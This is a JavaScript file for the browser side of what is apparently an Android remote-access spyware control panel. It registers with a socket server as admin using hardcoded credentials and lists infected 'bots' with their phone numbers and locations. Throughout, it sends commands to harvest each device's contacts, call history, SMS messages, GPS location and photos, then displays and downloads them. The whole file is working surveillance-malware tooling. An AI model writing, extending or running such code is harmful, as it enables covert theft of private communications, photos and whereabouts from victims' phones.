var socket = io.connect('http://localhost:3000');       //Connect socket to node.js server

socket.emit('registerAdmin', {usrType: 'admin', usrName: 'kiran', pass: 'suthar'});     //Register

var _botDataList = [];      //TO store multiple bots data
var currentUID = "";        //To store current selected bot uid

socket.on("registerBotClient", function (data) {
    _botDataList.length = 0;
    for (var i = 0; i < data.botDataList.length; i++)
        newBotHandler(data.botDataList[i])
});


function newBotHandler(data) {
    console.log(data);
    var d = new Date();
    var bot = {
        uid: data.uid,
        provider: data.provider,
        device: data.device,
        sdk: data.sdk,
        version: data.version,
        phone: data.phone,
        location: data.location,

        status: true,
        lastSeen: d.toDateString()
    };
    _botDataList.push(bot);

    if (data.uid === currentUID) {
        botStatus_para.innerText = 'ONLINE';
        botStatus_para.style.color = '#2b542c';
    }
}       //Function to handle new bot connected and show it on the screen


socket.on('offlineBot', function (uid) {
    for (var i = _botDataList.length - 1; i >= 0; i--) {
        if (_botDataList[i].uid === uid) {
            _botDataList[i].status = false;
            M.toast({html: 'Bot is offline :-('})
        }
    }
    if (uid === currentUID) { //Set text to offline when bot goes offline
        botStatus_para.innerText = 'OFFLINE';
        botStatus_para.style.color = '#dd4545'
    }
});     //When a bot goes offline

socket.on('custom-error', function (data) {
    //alert(data.error);
});     //Custom error send by server


new Vue({
    el: '#indexApp',
    data: {
        bots: _botDataList
    },
    methods: {
        gotoHome: function (uid) {
            currentUID = uid;
            console.log(uid + 'Uid gotoHome');
            table_div.style.visibility = 'hidden';
            home_div.style.visibility = 'visible';
            toolbar_div.style.height = 'auto';
            toolbar_div.style.visibility = 'visible';

            if (uid === currentUID) {
                botStatus_para.innerText = 'ONLINE';
                botStatus_para.style.color = '#2b542c';
            }
            for (var i = 0; i < _botDataList.length; i++)
                if (_botDataList[i].uid === currentUID)
                    myMap(_botDataList[i].location.lat, _botDataList[i].location.lon);

        }
    }
});

var table_div = document.getElementById('table'),
    home_div = document.getElementById('home'),
    contacts_div = document.getElementById('contacts'),
    toolbar_div = document.getElementById('toolBar'),
    callLog_div = document.getElementById('callLog'),
    messages_div = document.getElementById('messages'),
    location_div = document.getElementById('location'),
    images_div = document.getElementById('images'),
    camera_div = document.getElementById('camera'),
    download_div = document.getElementById('download'),
    btns = document.getElementsByClassName("btn waves-effect waves-light"),
    botStatus_para = document.getElementById('botStatus'),
    refresh_check = document.getElementById('refresh-check');

var firstLoadContacts = true,
    firstLoadCallLog = true,
    firstLoadMessages = true,
    firstLoadImages = true,
    firstLoadCamera = true;

function getContacts() {
    hideOtherTabs('contacts_div');
    if (refresh_check.checked || firstLoadContacts) {
        contacts_div.innerHTML = 'Loading contacts, Please Wait...';
        socket.emit('commands', {commands: [{command: 'getContacts'}], uid: currentUID});
    }
    firstLoadContacts = false;
    refresh_check.checked = false;

}

function getCallLog() {
    hideOtherTabs('callLog_div');
    if (refresh_check.checked || firstLoadCallLog) {
        callLog_div.innerHTML = 'Loading call-log, Please Wait...';
        socket.emit('commands', {commands: [{command: 'getCallHistory', arg1: 100}], uid: currentUID});
    }
    firstLoadCallLog = false;
    refresh_check.checked = false;
}

function getMessages() {
    hideOtherTabs('messages_div');
    if (refresh_check.checked || firstLoadMessages) {
        messages_div.innerHTML = 'Loading messages, Please Wait...';
        socket.emit('commands', {commands: [{command: 'getSms', arg1: 100}], uid: currentUID});
    }
    firstLoadMessages = false;
    refresh_check.checked = false;
}

function getLocation() {
    hideOtherTabs('location_div');
    if (refresh_check.checked) {
        location_div.innerHTML = 'Loading location, Please Wait...';
        socket.emit('commands', {commands: [{command: 'getLocation'}], uid: currentUID});
    }
    refresh_check.checked = false;
}

function getImages() {
    hideOtherTabs('images_div');
    if (refresh_check.checked || firstLoadImages) {
        i = 0;
        images_div.innerHTML = 'Loading images, Please Wait...';
        socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});

        setTimeout(function () {
            socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
        }, 5000)
    }
    firstLoadImages = false;
    refresh_check.checked = false;
}

function getCamera() {
    hideOtherTabs('camera_div');
    if (refresh_check.checked || firstLoadCamera) {
        //camera_div.innerHTML = 'Loading live-camera, Please Wait...';
        //socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
        handleCamera("Abhinav");
    }
    firstLoadCamera = false;
    refresh_check.checked = false;

}

function getDownload() {
    hideOtherTabs('download_div')
}

//When a bot sends data to web client
socket.on('usrData', function (data) {

    console.log(data.data.dataType);

    if (data.uid === currentUID) {
        if (data.data.dataType === 'contacts') handleContacts(data.data);
        if (data.data.dataType === 'callLog') handleCallLog(data.data);
        if (data.data.dataType === 'sms') handleMessages(data.data);
        if (data.data.dataType === 'location') handleLocation(data.data);
        if (data.data.dataType === 'images') handleImages(data.data);
        if (data.data.dataType === 'live-camera') handleCamera(data.data);
        if (data.data.dataType === 'downloadImage') downloadImage(data.data);
    } else console.log('UID did not match');

});

function handleContacts(data) {
    //console.log(data);
    contacts_div.innerHTML = '';
    var persons = JSON.parse(data.contacts);
    contacts_div.appendChild(document.createTextNode(persons.length));
    for (var i = 0; i < persons.length; i++) {
        var para = document.createElement("p");
        var node = document.createTextNode(persons[i].name + '\t\t' + persons[i].phoneNo);
        para.appendChild(node);
        para.style.borderBottom = '1px solid #ddd';
        contacts_div.appendChild(para);
    }
}

function handleCallLog(data) {
    //console.log(data);

    callLog_div.innerHTML = '';
    var callType;
    var callLog = JSON.parse(data.callLog);
    callLog_div.appendChild(document.createTextNode(callLog.length));
    for (var i = 0; i < callLog.length; i++) {
        var para = document.createElement("p");

        if (callLog[i].type === '1') {
            para.style.color = '#3c763d';
            callType = '(Incoming) ';
        }
        if (callLog[i].type === '2') {
            para.style.color = '#4f44dd';
            callType = '(Outgoing) ';
        }
        if (callLog[i].type === '3') {
            para.style.color = '#dd493f';
            callType = '(Missed) ';
        }
        if (callLog[i].type === '5') {
            para.style.color = '#de35ff';
            callType = '(Rejected) ';
        }

        var node = document.createTextNode(callType + '\t\t' + callLog[i].name + '\t\t' + callLog[i].number + '\t\t' + callLog[i].date + '\t\t' + callLog[i].duration);
        para.appendChild(node);

        para.style.borderBottom = '1px solid #ddd';
        callLog_div.appendChild(para);
    }
}

function handleMessages(data) {
    //console.log(data);

    messages_div.innerHTML = '';
    var userSms = JSON.parse(data.sms);
    messages_div.appendChild(document.createTextNode(userSms.length));
    for (var i = 0; i < userSms.length; i++) {
        var para = document.createElement("p");
        var node = document.createTextNode(userSms[i].name + '\t\t' + userSms[i].address + '\t\t' + userSms[i].date + '\t\t' + userSms[i].body);
        para.appendChild(node);
        para.style.borderBottom = '1px solid #ddd';
        messages_div.appendChild(para);
    }
}

function handleLocation(data) {
    //console.log(data);

    var locJSON = JSON.parse(data.location);
    myMap(locJSON.lat, locJSON.lon);
}

var i = 0;

function handleImages(data) {

    var image = {
        name: data.name,
        date: data.date,
        bucket: data.bucket,
        path: data.path,
        imgData: data.image64
    };

    if (i === 0) images_div.innerHTML = '';

    showImage(image);
    if (!mouse_status) images_div.scrollTop = images_div.scrollHeight;

    if (++i === parseInt(data.length)) {
        console.log(i + ' images uploaded');
        M.toast({html: i + ' images uploaded :-)'});
    }

}

function showImage(data) {
    var img = document.createElement('img');
    img.id = 'btmImage';
    img.style.width = '10%';
    img.style.margin = '8px';
    img.src = 'data:image/png;base64, ' + data.imgData;
    images_div.appendChild(img);

    img.addEventListener('click', function (e) {
        if (e.target && e.target.id === 'btmImage') {//do something}
            console.log(data);
            socket.emit('commands', {commands: [{command: 'downloadImage', arg1: data.path}], uid: currentUID})
        }
    })

}

function handleCamera(data) {
    console.log(data);

    /*var video = document.getElementById('live-cam'),
        vendorUrl = window.URL || window.webkitURL;

    navigator.getMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;

    navigator.getUserMedia({audio: false, video: true}, function (stream2) {
        console.log(stream2);

        video.src = vendorUrl.createObjectURL(stream2);

        setTimeout(function () {

        }, 10000);

    }, function (error) {
        console.log(error);
    });*/
}

function downloadImage(data) {
    var name = data.name;
    var img_src = 'data:image/jpeg;base64, ' + data.image64;

    M.toast({html: name + ' is ready to download'});

    var x = document.createElement("IMG");
    x.style.width = '10%';
    //x.style.height = x.width;
    x.style.margin = '8px';
    x.classList.add('center-crop');
    x.src = img_src;

    var aTag = document.createElement('a');
    aTag.setAttribute('href', img_src);
    aTag.download = name;
    aTag.style.cssFloat = 'bottom';
    aTag.id = 'imgDownload';

    aTag.innerHTML = x.outerHTML;
    download_div.appendChild(aTag);

    aTag.addEventListener('click', function (e) {
        if (e.target && e.target.id === 'imgDownload') {//do something}
            console.log('Listener Called Remove Child');
            e.parentNode.removeChild(e);
        }
    })
}

function hideOtherTabs(tabName) {

    table_div.style.visibility = 'hidden';
    home_div.style.visibility = 'hidden';
    contacts_div.style.visibility = 'hidden';
    callLog_div.style.visibility = 'hidden';
    messages_div.style.visibility = 'hidden';
    location_div.style.visibility = 'hidden';
    images_div.style.visibility = 'hidden';
    camera_div.style.visibility = 'hidden';
    download_div.style.visibility = 'hidden';

    if (tabName === 'table_div') table_div.style.visibility = 'visible';
    if (tabName === 'home_div') home_div.style.visibility = 'visible';
    if (tabName === 'contacts_div') contacts_div.style.visibility = 'visible';
    if (tabName === 'callLog_div') callLog_div.style.visibility = 'visible';
    if (tabName === 'messages_div') messages_div.style.visibility = 'visible';
    if (tabName === 'location_div') location_div.style.visibility = 'visible';
    if (tabName === 'images_div') images_div.style.visibility = 'visible';
    if (tabName === 'camera_div') camera_div.style.visibility = 'visible';
    if (tabName === 'download_div') download_div.style.visibility = 'visible';

}

function myMap(lat, lon) {

    var myCenter = new google.maps.LatLng(lat, lon);
    var mapCanvas = location_div;
    var mapOptions = {center: myCenter, zoom: 15};
    var map = new google.maps.Map(mapCanvas, mapOptions);
    var marker = new google.maps.Marker({position: myCenter});
    marker.setMap(map);

}

var mouse_status = false;

function mouseStatus(bool) {
    mouse_status = bool;
}